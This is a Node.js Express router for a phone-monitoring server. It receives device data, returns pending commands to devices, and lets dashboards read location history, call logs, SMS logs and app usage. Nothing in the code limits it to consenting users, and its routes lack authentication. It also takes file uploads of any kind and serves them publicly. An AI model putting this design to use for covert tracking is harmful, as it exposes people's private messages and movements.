const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const uploadDir = path.join(__dirname, '..', 'public', 'downloads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });

const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage });

module.exports = ({ queries, saveDeviceData, broadcastToDashboards }) => {
    const router = express.Router();

    router.post('/upload', upload.single('file'), (req, res) => {
        if (!req.file) return res.status(400).json({ error: 'No file uploaded' });
        res.json({ url: `/downloads/${req.file.filename}` });
    });

    // HTTP data upload (fallback when WebSocket unavailable)
    router.post('/device/:id/data', (req, res) => {
        try {
            const device = queries.getDevice(req.params.id);
            if (!device) return res.status(404).json({ error: 'Device not found' });

            saveDeviceData(req.params.id, req.body);
            const state = queries.getState(req.params.id);
            broadcastToDashboards({ type: 'device_update', device_id: req.params.id, state });

            const pending = queries.getPendingCommands(req.params.id) || [];
            res.json({ success: true, pending_commands: pending });
        } catch (e) {
            console.error('[API] Data error:', e.message);
            res.status(500).json({ error: e.message });
        }
    });

    // Get device state
    router.get('/device/:id/state', (req, res) => {
        const state = queries.getState(req.params.id);
        res.json(state || {});
    });

    // Get location history
    router.get('/device/:id/locations', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getLocations(req.params.id, limit) || []);
    });

    // Get last location
    router.get('/device/:id/location', (req, res) => {
        res.json(queries.getLastLocation(req.params.id) || {});
    });

    // Get app usage
    router.get('/device/:id/appusage', (req, res) => {
        const limit = parseInt(req.query.limit) || 200;
        res.json(queries.getAppUsage(req.params.id, limit) || []);
    });

    // Get top apps (last 24h)
    router.get('/device/:id/topapps', (req, res) => {
        const since = Math.floor(Date.now() / 1000) - 86400;
        res.json(queries.getTopApps(req.params.id, since) || []);
    });

    // Get call logs
    router.get('/device/:id/calllogs', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getCallLogs(req.params.id, limit) || []);
    });

    // Get SMS logs
    router.get('/device/:id/smslogs', (req, res) => {
        const limit = parseInt(req.query.limit) || 100;
        res.json(queries.getSmsLogs(req.params.id, limit) || []);
    });

    // Get live feed
    router.get('/device/:id/feed', (req, res) => {
        const limit = parseInt(req.query.limit) || 50;
        res.json(queries.getFeed(req.params.id, limit) || []);
    });

    return router;
};
